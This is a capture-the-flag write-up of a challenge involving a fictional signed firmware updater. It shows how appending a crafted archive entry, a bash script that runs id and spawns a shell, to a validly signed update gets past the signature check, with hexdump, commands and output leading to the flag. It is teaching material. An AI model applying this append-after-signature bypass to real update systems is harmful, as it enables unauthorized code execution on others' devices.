# Firmware

We're given a Femtium-based firmware update utility for the IBM PC, that is,
the International Bongo Manufacturer's Percussive Companion. A+ for humor, by
the way! The Bongo Manufacturer is keen on security, and to make sure you can
trust their firmware updates, they've included a copy of the tool that creates
the signed firmware update packages, except of course the private part of the
asymmetric signing key.

A few strategies came to mind right away:

* This could be a deliberately weak RSA key, and the challenge is to recover
  the actual signing key.
* There could be a side channel attack in the firmware updater, which could
  allow us to guess a correct signature without knowing the private key at all.
* There could be an error in the signature verification implementation or in
  the algorithm that processes the file after successful signature verification
  that allows us to circumvent it.

Examining the script that generates a firmware update package reveals that the
signature is made using standard algorithms, so there's little chance for
errors in the implementation.

I did try a quick once-over with an [RSA CTF tool](https://github.com/Ganapati/RsaCtfTool),
to check for the most obvious weak key errors, but that didn't yield anything
useful.

My next thought was, that perhaps we can simply extend an existing, valid
update file. Since the file header contains a field indicating how long the
archive is, perhaps the signature check relies only on this length to validate
the signature, but the extraction routine ignores it and processes all the data
that follows the header? Let's try it out:

I created an firmware update containing only an update.sh. The file header and
contents take up the last 64 bytes of that archive, like this:

```
user@sphinx:~/firmware$ tail -c 64 my-iBongoUpdate.bfw  | hexdump -C
00000000  09 75 70 64 61 74 65 2e  73 68 00 00 00 00 00 00  |.update.sh......|
00000010  00 00 2d 23 21 2f 62 69  6e 2f 62 61 73 68 0a 0a  |..-#!/bin/bash..|
00000020  65 63 68 6f 20 52 75 6e  6e 69 6e 67 20 75 70 64  |echo Running upd|
00000030  61 74 65 2e 73 68 0a 0a  69 64 0a 62 61 73 68 0a  |ate.sh..id.bash.|
00000040
```

Appending this portion of the archive to an official, signed update binary does
the trick:

```
user@sphinx:~/firmware$ (cat official-iBongoUpdate-0.1.bfw; tail -c 64 my-iBongoUpdate.bfw ) > iBongoUpdate_padded.bfw

noob@sphinx # ./firmware iBongoUpdate_padded.bfw
Extraction complete!
Executing update.sh
Running update.sh
uid=1006(ibongo) gid=1000(user) groups=1000(user)

ibongo@sphinx # cat protected/flag.txt
FE{1f-only-4ll-th3-th1ng5-w3r3-th15-345y-to-pwn}
```


---
_Peter Tirsek, 2020-01-25_
